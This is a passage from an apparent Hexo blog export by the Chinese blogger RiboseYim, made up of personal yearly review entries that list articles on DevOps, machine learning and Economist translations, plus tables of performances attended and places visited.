<h3 id="三、文章列表"><a href="#三、文章列表" class="headerlink" title="三、文章列表"></a>三、文章列表</h3><ol>
<li>原创：<a href="https://riboseyim.github.io/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南</a></li>
<li>翻译：TED访谈<a href="https://riboseyim.github.io/2016/05/28/Linux/">Linus Torvalds: The mind behind Linux</a>（高效运维公众号推荐）</li>
<li>原创：<a href="https://riboseyim.github.io/2016/06/12/Technology-Oracle/">Oracle数据库迁移割接实践</a>（高效运维公众号推荐）</li>
<li>原创：<a href="https://riboseyim.github.io/2016/09/01/AAA/">基于LVS的AAA负载均衡架构实践</a>： 开源中国（首页推荐|每日一博），当日阅读2000+，收藏人数100+</li>
<li>原创：<a href="https://riboseyim.github.io/2016/11/04/OpenSource-Ganglia/">基于Ganglia实现服务集群性能态势感知</a>（开源中国推荐）</li>
<li>原创：<a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术：Linux喜迎DTrace</a>（开源中国推荐）</li>
<li>翻译：<a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/">《Stack Overflow: The Architecture - 2016 Edition》</a>（高效运维公众号推荐）</li>
<li>翻译：<a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/">《Stack Overflow: The Hardware》</a></li>
<li>翻译：<a href="https://riboseyim.github.io/2016/08/15/OpenSource-Kafka/">《LinkedIn开源Kafka Monitor》</a></li>
<li>翻译：<a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security:网络安全专题</a></li>
<li>原创：<a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">《木马来袭：今天你被挖矿了吗？》</a></li>
<li>原创：<a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">《木马来袭：SSH并不安全》</a></li>
<li>原创：<a href="https://riboseyim.github.io/2016/06/11/Writing/">《最佳写作实践：从Evernote到Ulysses》</a></li>
<li>原创：<a href="http://www.jianshu.com/p/db8e8a2884ef">《基于Linux单机的负载评估》</a></li>
<li>翻译：<a href="http://www.jianshu.com/p/fd6e35f529c1">《Linux性能分析模型－In 60 Seconds》</a></li>
<li>原创：<a href="http://www.jianshu.com/p/8addb7d0024f">基于Github的开源项目管理流程（1）</a></li>
<li>翻译：<a href="http://www.jianshu.com/p/b268267800e9">NTOP 2016 路线图</a>（开源中国推荐）</li>
<li>原创：<a href="http://www.jianshu.com/p/c92c042b1b34">美军体能训练观察</a></li>
<li>原创：<a href="http://www.jianshu.com/p/0edcc6402fc4">美军士官制度观察</a></li>
<li>原创：<a href="http://www.jianshu.com/p/4c3731d6b552">体能标准横向评测</a></li>
<li>原创：<a href="http://www.jianshu.com/p/5290fc641230">跑步应用Nike+ Running与Garmin Mobile评测</a></li>
<li>读书笔记：<a href="http://www.jianshu.com/p/e9004fb31f3e">《李自成》（姚雪垠）</a></li>
<li>读书笔记：<a href="http://www.jianshu.com/p/b2bc9871d129">《万历十五年(黄仁宇)》</a></li>
<li>读书笔记：<a href="http://www.jianshu.com/p/8376f08e6b90">《放宽历史的视界》(黄仁宇)</a></li>
<li>读书笔记：<a href="http://www.jianshu.com/p/c43df2f608bb">《国士无双伍连德》</a></li>
<li>读书笔记：<a href="http://www.jianshu.com/p/88f20aa63c39">粮食还是罂粟？小说中的经济学悖论</a></li>
<li>读书笔记：<a href="http://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;tempkey=RvzJtGnWznLJ3NUPvQx4vu149A3kOJ0N1B6VTbsAs8UbMMlfqjNsX78Zpkf36eIsUVb2HnS0wcjXAYZoAkYIgt7mg%2BYPEmxjjlC7EMzexJ8WP0u%2B%2BFKgKKC2elJLXN5pEhqM0b4i3%2FuGko%2BwLRucQg%3D%3D&amp;#rd">传统兵法摘要：选兵练将</a></li>
<li>翻译：<a href="http://www.jianshu.com/p/663ffcd0d2a2">Economist译文:欧洲难民计划：移民危机管理</a></li>
<li>翻译：<a href="http://www.jianshu.com/p/351bc45763cb">Economist译文:The Saudi blueprint 沙特王国的改革蓝图</a></li>
<li>翻译：<a href="http://www.jianshu.com/p/9c5f837030e9">Economist译文:2016年全球经济形势预测</a></li>
<li>翻译：<a href="http://www.jianshu.com/p/d525f1a7fd25">Economist译文:印度电商竞赛</a></li>
<li>翻译：<a href="http://www.jianshu.com/p/2cfd0b46f1c5">Economist译文:越共换届－巨变或轮回？</a>（201612封禁）</li>
<li>翻译：<a href="http://www.jianshu.com/p/670c4d2bb419">Economist译文:事与愿违的后门程序</a></li>
<li>翻译：<a href="http://www.jianshu.com/p/ce638dafe225">Economist译文:当代德国纳粹魅影</a></li>
<li>翻译：<a href="http://www.jianshu.com/p/f5f55bbe9d57">Economist译文:自由迁徙的障碍</a>（201612封禁）</li>
<li>翻译：<a href="http://www.jianshu.com/p/18edbb3023f6">Economist译文:奢侈品—万金藏獒</a>（201612封禁）</li>
<li>原创：<a href="https://mp.weixin.qq.com/cgi-bin/appmsg?begin=0&amp;count=10&amp;t=media/appmsg_list&amp;type=10&amp;action=list_card&amp;lang=zh_CN&amp;token=1371525865">钞票任务：风流小王爷</a></li>
<li>原创：<a href="https://mp.weixin.qq.com/cgi-bin/appmsg?begin=10&amp;count=10&amp;t=media/appmsg_list2&amp;type=10&amp;action=list_card&amp;token=1371525865&amp;lang=zh_CN">艺术评论：舞台剧《南海十三郎》幕后故事</a></li>
<li>原创：<a href="https://riboseyim.github.io/2016/09/10/Lincoln/">艺术评论：电影《灵魂解码《林肯》》</a></li>
</ol>
<hr>

<h2 id="2016年中盘点"><a href="#2016年中盘点" class="headerlink" title="2016年中盘点"></a>2016年中盘点</h2><h4 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h4><p>1.从阅读到翻译的进化</p>
<p>2.若要阅读，必须写作，做项目一样去写作</p>
<p>3.注意力是最宝贵的资源</p>
<p>4.向看不见的朋友学习</p>
<p>5.人的终极追求：”Just for Fun!”</p>
<p>6.付费意识：为演化买单</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/2016年中盘点.png" alt="2016年中盘点.png"></p>
<!--more-->
<h4 id="最佳信源：《Economist》"><a href="#最佳信源：《Economist》" class="headerlink" title="最佳信源：《Economist》"></a>最佳信源：《Economist》</h4><p>如何使用有限的篇幅阐述观点<br>如何在团队活动中协调一致性：《the economist style》<br>如何建立专业分析数据库，数据可视化</p>
<h4 id="最佳教练：专业社区"><a href="#最佳教练：专业社区" class="headerlink" title="最佳教练：专业社区"></a>最佳教练：专业社区</h4><p>高效运维社区、InfoQ社区、GitHub社区</p>
<h4 id="工具箱：写作三件套"><a href="#工具箱：写作三件套" class="headerlink" title="工具箱：写作三件套"></a>工具箱：写作三件套</h4><p>素材仓库：Evernote<br>思维绘图：OmniGraffle<br>专业写作：Ulysses</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/驱动力图－2016年中盘点.png" alt="随机事件－无方向试错驱动"></p>
<h4 id="不可忽视随机事件的驱动力"><a href="#不可忽视随机事件的驱动力" class="headerlink" title="不可忽视随机事件的驱动力"></a>不可忽视随机事件的驱动力</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/驱动力图－随机事件案例.png" alt="案例"></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title>Autobiography Of RiboseYim</title>
    <url>/2016/06/03/Autobiography/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>年表</li>
</ul>
<a id="more"></a>
<h2 id="年表"><a href="#年表" class="headerlink" title="年表"></a>年表</h2><ul>
<li><a href="https://riboseyim.github.io/2018/12/31/Check2019/" target="_blank" rel="noopener">我的 2019 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2018/01/01/Check2018/" target="_blank" rel="noopener">我的 2018 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/10/Check2017/" target="_blank" rel="noopener">我的 2017 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/01/01/Check2016/" target="_blank" rel="noopener">我的 2016 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/28/Check2012/" target="_blank" rel="noopener">我的 2012 阅读书单</a></li>
</ul>
<h4 id="一些琐碎的记录"><a href="#一些琐碎的记录" class="headerlink" title="一些琐碎的记录"></a>一些琐碎的记录</h4><ul>
<li>2012年9月13日</li>
</ul>
<p>阅读卢梭的《忏悔录》。雅克的坦白简直让人震惊！但时作者已是欧洲名人，仍可公开地解剖自己，乃至于一切“肮脏龌龊的行径”。相比于巴顿喋喋不休地介绍自己的光荣家族世系，比较今天那些所谓成功人士粉饰出身的卑鄙手段，我不禁为“惟大英雄能本色”这句话拍案击节。</p>
<ul>
<li>2019年03月</li>
</ul>
<p>阅读卡普兰的《武士政治》。</p>
<blockquote>
<p>李维告诉我们，直面敌人所需要的勇气必须最终来自对我们的过去和我们的成就的骄做。把我们的过去浪漫化是需要培植的、而不是需要害羞的事情。—— 罗伯特·D·卡普兰 |《武士政治》p045</p>
</blockquote>
]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title>我的2018年度盘点</title>
    <url>/2018/01/01/Check2018/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>想要解决一个有趣的问题，先去找一个让你感兴趣的问题。— 《大教堂与集市》</p>
</blockquote>
<ul>
<li>Introduction of Machine Learning</li>
<li>Intelligence &amp; Spider</li>
<li>Creativity &amp; Freedom</li>
</ul>
<span id="more"></span>
<p>This article is part of an <strong>Autobiography</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/12/31/Check2019/">我的 2019 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2018/01/01/Check2018/">我的 2018 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/10/Check2017/">我的 2017 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/01/01/Check2016/">我的 2016 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/28/Check2012/">我的 2012 阅读书单</a></li>
</ul>
<h2 id="一、Core-Topics"><a href="#一、Core-Topics" class="headerlink" title="一、Core Topics"></a>一、Core Topics</h2><ul>
<li>Hacker: Creativity &amp; Freedom</li>
<li>Economist: Intelligence &amp; Spider、Intellectual Property Law</li>
<li>Introduction to Machine Learning：Mathmetics &amp; Algorithms</li>
<li>Skills: Golang、R</li>
</ul>
<h2 id="二、年度成果"><a href="#二、年度成果" class="headerlink" title="二、年度成果"></a>二、年度成果</h2><h4 id="年度导师"><a href="#年度导师" class="headerlink" title="年度导师"></a>年度导师</h4><blockquote>
<p>我们现在生活在一个没有科学的时代，几乎人们所有的交流、电视上的言论和书本，所有这些都充斥着不科学的东西。不是说那些内容不好，我是说他们是不科学的。于是，就出现了大量打着科学旗号的智力专制。<br>科学的各个学科门类在其发展过程中都有过这样的教训：认为先辈大师们字字珠玑、说的都是绝对真理，这样的信念是很危险的。<br>—— 理查德·费曼 1966年4月</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Feynman.jpeg" alt=""></p>
<h4 id="科学锻炼"><a href="#科学锻炼" class="headerlink" title="科学锻炼"></a>科学锻炼</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Keep_2018.jpeg" alt=""></p>
<h4 id="Tech-Blog"><a href="#Tech-Blog" class="headerlink" title="Tech Blog"></a>Tech Blog</h4><ul>
<li>上线一个纯洁的域名 <strong><a href="https://riboseyim.com">https://riboseyim.com</a></strong></li>
<li>粤ICP备18143203号-1  </li>
<li>粤公网安备44010602005988号</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/riboseyim_com_footer.png" alt=""></p>
<h4 id="过程改进-amp-方法论"><a href="#过程改进-amp-方法论" class="headerlink" title="过程改进 &amp; 方法论"></a>过程改进 &amp; 方法论</h4><ul>
<li><a href="https://riboseyim.github.io/2017/09/08/Policy-Poverty/">芝加哥大学：贫穷如何改变你的思维模式</a></li>
<li><a href="https://riboseyim.github.io/2017/05/09/CyberSecurity-Hacker/">黑客与技术、产业及其精神世界</a></li>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">DevOps 漫谈：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.com/2018/12/02/Writing-Technical/">技术团队中的作家</a></li>
<li><a href="https://riboseyim.github.io/2017/06/03/Writing-WriterToolChain/">我的写作工具链（v6-201812）</a></li>
<li><a href="https://riboseyim.github.io/2017/07/09/Law-Of-Intellectual-Property/">知识产权法（Intellectual Property Law）</a></li>
<li><a href="https://riboseyim.github.io/2018/03/25/Mathmetics-Complexity/">数学常识| 如何度量复杂性</a></li>
<li><a href="https://riboseyim.github.io/2017/04/21/Health/">医学常识| IT 工程师养生指南</a></li>
<li><a href="https://riboseyim.github.io/2018/01/22/Health-Emotional/">医学常识| NIH 情绪健康检查单</a></li>
<li><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></li>
<li>专利实务（发明）申请号：201811427043.2</li>
</ul>
<h2 id="三、Information-Technology"><a href="#三、Information-Technology" class="headerlink" title="三、Information Technology"></a>三、Information Technology</h2><ul>
<li><a href="https://riboseyim.github.io/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
<li><a href="https://riboseyim.github.io/2018/05/18/DevOps-OpenTracing/">DevOps 漫谈：分布式追踪系统标准体系</a></li>
<li><a href="https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus">DevOps 漫谈：开源分布式跟踪系统 OpenCensus</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Uber 开源 Java 分布式应用追踪工具：JVM Profiler</a></li>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">DevOps 漫谈：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2017/05/09/CyberSecurity-Hacker/">Cyber-Security: 黑客与技术、产业及其精神世界</a></li>
<li><a href="https://riboseyim.github.io/2018/06/12/DevOps-Container-Usage/">DevOps 漫谈：2018 年度 Docker 用户报告 - Sysdig Edition</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/12/DevOps-Container-Usage/">2018 年度 Docker 用户报告 - Sysdig Edition </a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="http://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651940438&amp;idx=2&amp;sn=24ef93587c062079f4e9de450e953f96&amp;chksm=bd5789448a200052a62730403d6926f3d9d1309de37faf823bb8e1d28f3ec006c0c791694a28#rd">From Better To Advanced | Go 语言开发入门书单</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
<li><a href="https://riboseyim.github.io/2018/01/03/OpenSource-DB-PostgreSQL/">开源技术架构漫谈：PostgreSQL 数据库</a></li>
<li><a href="http://riboseyim.github.com/2018/01/08/Linux-Works-Network/">How Linux Works(四)：Network</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">Linux Commands Extension</a></li>
<li><a href="https://riboseyim.github.io/2017/12/19/Linux-Win-Mac/">谁是王者：macOS vs Linux Kernels ？</a></li>
</ul>
<h2 id="四、Economist"><a href="#四、Economist" class="headerlink" title="四、Economist"></a>四、Economist</h2><ul>
<li><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></li>
<li><a href="http://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/">嗑药简史（三）：瘾品管制背后的情与法</a></li>
<li><a href="https://riboseyim.github.io/2018/01/07/Policy-Law-Family/">经济学人：加拿大的一夫多妻问题 —— 摩门教、移民和穆斯林</a></li>
<li><a href="http://riboseyim.github.io/2017/08/29/Machine-Learning-News/">经济学人：No PhD, No Problem (人工智能教育产业化)</a></li>
<li><a href="https://riboseyim.github.io/2018/12/08/Economist-Books-Year-2018/">The Economist 2018年度推荐书单</a></li>
<li><a href="https://riboseyim.github.io/2018/01/30/Economist-Books-Year-2017/">The Economist 2017年度推荐书单</a></li>
<li>再次强调一手研究的重要性</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Search_2018.png" alt="2017年发表，2018年热点事件触发搜索高峰"></p>
<h2 id="六、Culture-amp-History"><a href="#六、Culture-amp-History" class="headerlink" title="六、Culture &amp; History"></a>六、Culture &amp; History</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/Artistic-Classical/">古典音乐低俗史</a></li>
<li><a href="https://riboseyim.github.io/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/">红楼故事：康熙的秘密情报系统</a></li>
<li><a href="https://riboseyim.github.io/2018/12/31/History-Empire/">荐书|帝国的铸就</a></li>
</ul>
<h2 id="演出活动"><a href="#演出活动" class="headerlink" title="演出活动"></a>演出活动</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类别</th>
<th>剧目</th>
<th>演出</th>
<th>地点</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr>
<td>话剧</td>
<td>荒诞喜剧《破阵子》</td>
<td></td>
<td>广东演艺中心</td>
<td>201804</td>
</tr>
<tr>
<td>话剧</td>
<td>《雁叫长空》</td>
<td>厦门歌舞剧团</td>
<td>广州大剧院</td>
<td>201805</td>
</tr>
<tr>
<td>越剧</td>
<td>《牡丹亭》</td>
<td>浙江越剧团</td>
<td>广东演艺中心</td>
<td>201805</td>
</tr>
<tr>
<td>越剧</td>
<td>《红楼梦》</td>
<td>上海越剧团</td>
<td>广州大剧院</td>
<td>201806</td>
</tr>
<tr>
<td>器乐</td>
<td>主题：古韵今声</td>
<td>古琴</td>
<td>星海音乐厅</td>
<td>20181020</td>
</tr>
<tr>
<td>古典</td>
<td>主题：柴科夫斯基</td>
<td></td>
<td>星海音乐厅</td>
<td>20180930</td>
</tr>
<tr>
<td>合唱</td>
<td>童声合唱团</td>
<td></td>
<td>星海音乐厅</td>
<td></td>
</tr>
<tr>
<td>话剧</td>
<td>童声合唱团</td>
<td></td>
<td>星海音乐厅</td>
<td></td>
</tr>
<tr>
<td>器乐</td>
<td>唢呐</td>
<td>广东民族乐团</td>
<td>星海音乐厅</td>
<td></td>
</tr>
<tr>
<td>话剧</td>
<td>《麦克白》</td>
<td></td>
<td>广州大剧院</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h2 id="户外活动"><a href="#户外活动" class="headerlink" title="户外活动"></a>户外活动</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类别</th>
<th>地点</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr>
<td>美术奇观 <br> 历史遗址</td>
<td>洛阳龙门石窟</td>
<td>201807</td>
</tr>
<tr>
<td>地质奇观 <br> 历史遗址</td>
<td>郑州黄河风景区 （民间宗教）</td>
<td>201807</td>
</tr>
<tr>
<td>地质奇观 <br> 历史遗址</td>
<td>登封嵩山少林寺（佛教全国重点寺院）</td>
<td>201809</td>
</tr>
<tr>
<td>历史遗址</td>
<td>中共赣南省委旧址（耶稣宝血堂）<br>苏区赣南省裁判部旧址 <br>苏区赣南省政治保卫局旧址<br>红四军军部/政治部旧址（葛氏宗祠）</td>
<td>201802</td>
</tr>
<tr>
<td>历史遗址</td>
<td>广州·六榕寺（佛教全国重点寺院）</td>
<td></td>
</tr>
<tr>
<td>历史遗址</td>
<td>广州·詹天佑故居</td>
<td></td>
</tr>
<tr>
<td>历史遗址</td>
<td>广州·沙面</td>
<td></td>
</tr>
<tr>
<td>历史遗址</td>
<td>天津·溥仪故居</td>
<td></td>
</tr>
<tr>
<td>历史遗址</td>
<td>天津·庆亲王府</td>
<td></td>
</tr>
<tr>
<td>历史遗址</td>
<td>大爆炸遗址公园</td>
</tr>
</tbody>
</table>
</div>
<h2 id="Unfinished"><a href="#Unfinished" class="headerlink" title="Unfinished"></a>Unfinished</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/27/Language-Go-lang-Web/">玩转编程语言:基于Golang开发Web应用</a></li>
<li>Priview<a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li>Preview<a href="http://riboseyim.github.com/2018/01/07/History-Tang/">关于唐史</a></li>
<li>Preview<a href="https://riboseyim.github.io/2018/01/17/History-Tang-DiRenjie/">唐史|狄仁杰</a></li>
<li>Preview<a href="http://riboseyim.github.com/2018/01/07/Addiction-Decision-Behavior/">《嗑药简史：行为成瘾》</a></li>
<li>Preview<a href="https://riboseyim.github.io/2018/03/30/Lincoln-Chicago-Orchestra/">关于交响乐团</a></li>
<li><a href="https://riboseyim.github.io/2018/03/21/Machine-Learning-WordBook/">Machine Learning:WordBook</a></li>
<li><a href="https://riboseyim.github.io/2018/02/27/Machine-Learning-TrainModel/">Machine Learning:Training Models</a></li>
</ul>
<h2 id="Sites-Map"><a href="#Sites-Map" class="headerlink" title="Sites Map"></a>Sites Map</h2><ul>
<li><a href="https://riboseyim.github.io">RiboseYim’s Home(riboseyim.github.io)</a></li>
<li><a href="https://riboseyim.com">RiboseYim’s Tech Blog(riboseyim.com)</a></li>
<li><a href="https://twitter.com/RiboseYim">RiboseYim’s Twitter</a></li>
<li><a href="https://t.me/riboseyim">RiboseYim’s Telegram</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/TlwVpgZVl1mWgSVs_ysXrw">为演好男神，越剧小生专业户的她研究起《来自星星的你》</a></li>
</ul>
]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title>Check2020</title>
    <url>/2020/02/09/Check2020/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<p>This article is part of an <strong>Autobiography</strong> series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/12/31/Check2019/" target="_blank" rel="noopener">我的 2019 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2018/01/01/Check2018/" target="_blank" rel="noopener">我的 2018 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/10/Check2017/" target="_blank" rel="noopener">我的 2017 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/01/01/Check2016/" target="_blank" rel="noopener">我的 2016 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/28/Check2012/" target="_blank" rel="noopener">我的 2012 阅读书单</a></li>
</ul>
<h1 id="2020年度计划（v1-202002）"><a href="#2020年度计划（v1-202002）" class="headerlink" title="2020年度计划（v1-202002）"></a>2020年度计划（v1-202002）</h1><h2 id="工程学"><a href="#工程学" class="headerlink" title="工程学"></a>工程学</h2><h3 id="（年度重点）可靠性理论与实践"><a href="#（年度重点）可靠性理论与实践" class="headerlink" title="（年度重点）可靠性理论与实践"></a>（年度重点）可靠性理论与实践</h3><h3 id="（重点）国防采购与军品质量控制"><a href="#（重点）国防采购与军品质量控制" class="headerlink" title="（重点）国防采购与军品质量控制"></a>（重点）国防采购与军品质量控制</h3><h4 id="G-Program-Management"><a href="#G-Program-Management" class="headerlink" title="G Program Management"></a>G Program Management</h4><h4 id="Exam-CISA"><a href="#Exam-CISA" class="headerlink" title="Exam CISA"></a>Exam CISA</h4><h4 id="Exam-PRINCE-2"><a href="#Exam-PRINCE-2" class="headerlink" title="Exam PRINCE 2"></a>Exam PRINCE 2</h4><h2 id="医学"><a href="#医学" class="headerlink" title="医学"></a>医学</h2><h3 id="（年度重点）呼吸内科：肺部康复"><a href="#（年度重点）呼吸内科：肺部康复" class="headerlink" title="（年度重点）呼吸内科：肺部康复"></a>（年度重点）呼吸内科：肺部康复</h3><h3 id="（年度重点）体能训练：游泳"><a href="#（年度重点）体能训练：游泳" class="headerlink" title="（年度重点）体能训练：游泳"></a>（年度重点）体能训练：游泳</h3><h2 id="战略学"><a href="#战略学" class="headerlink" title="战略学"></a>战略学</h2><h3 id="（年度重点）战役指挥理论与实践"><a href="#（年度重点）战役指挥理论与实践" class="headerlink" title="（年度重点）战役指挥理论与实践"></a>（年度重点）战役指挥理论与实践</h3><h4 id="（重点）粟裕的军事谋略与指挥艺术"><a href="#（重点）粟裕的军事谋略与指挥艺术" class="headerlink" title="（重点）粟裕的军事谋略与指挥艺术"></a>（重点）粟裕的军事谋略与指挥艺术</h4><h3 id="美国军事史-南北战争专题-（optional）"><a href="#美国军事史-南北战争专题-（optional）" class="headerlink" title="美国军事史 | 南北战争专题 （optional）"></a>美国军事史 | 南北战争专题 （optional）</h3><h2 id="参考文集"><a href="#参考文集" class="headerlink" title="参考文集"></a>参考文集</h2>]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
  </entry>
  <entry>
    <title>我的2019年度盘点</title>
    <url>/2018/12/31/Check2019/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<p>This article is part of an <strong>Autobiography</strong> series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/12/31/Check2019/" target="_blank" rel="noopener">我的 2019 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2018/01/01/Check2018/" target="_blank" rel="noopener">我的 2018 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/10/Check2017/" target="_blank" rel="noopener">我的 2017 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/01/01/Check2016/" target="_blank" rel="noopener">我的 2016 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/28/Check2012/" target="_blank" rel="noopener">我的 2012 阅读书单</a></li>
</ul>
<h2 id="Core-Topics"><a href="#Core-Topics" class="headerlink" title="Core Topics"></a>Core Topics</h2><ul>
<li>Capability: Project Management、Writing、R language、Mathmetics、Intelligence</li>
<li>Theory: Engineering Theory 、Construction、Physics</li>
<li>Tools &amp; Technology: 网络计划技术（OmniPlan-based）</li>
</ul>
<h2 id="二、年度成果"><a href="#二、年度成果" class="headerlink" title="二、年度成果"></a>二、年度成果</h2><h4 id="年度导师：丁士昭"><a href="#年度导师：丁士昭" class="headerlink" title="年度导师：丁士昭"></a>年度导师：丁士昭</h4><ul>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">《工程项目管理》| 同济大学MOOC</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/TongJi-CPM-%E4%B8%81%E5%A3%AB%E6%98%AD.png" alt></p>
<h4 id="年度导师：托马斯·谢林"><a href="#年度导师：托马斯·谢林" class="headerlink" title="年度导师：托马斯·谢林"></a>年度导师：托马斯·谢林</h4><h4 id="年度成果：跳绳"><a href="#年度成果：跳绳" class="headerlink" title="年度成果：跳绳"></a>年度成果：跳绳</h4><ul>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">战斗体能训练：跳绳</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E4%B8%AD%E5%AD%A6%E4%BD%93%E8%83%BD%E6%A0%87%E5%87%86-1min%E8%B7%B3%E7%BB%B3.png" alt></p>
<h4 id="年度成果：X-Program-Management"><a href="#年度成果：X-Program-Management" class="headerlink" title="年度成果：X Program Management"></a>年度成果：X Program Management</h4><h4 id="年度成果：S-Program-Management"><a href="#年度成果：S-Program-Management" class="headerlink" title="年度成果：S Program Management"></a>年度成果：S Program Management</h4><h4 id="年度成果：发明专利"><a href="#年度成果：发明专利" class="headerlink" title="年度成果：发明专利"></a>年度成果：发明专利</h4><p><strong>企业级知识产权协同</strong></p>
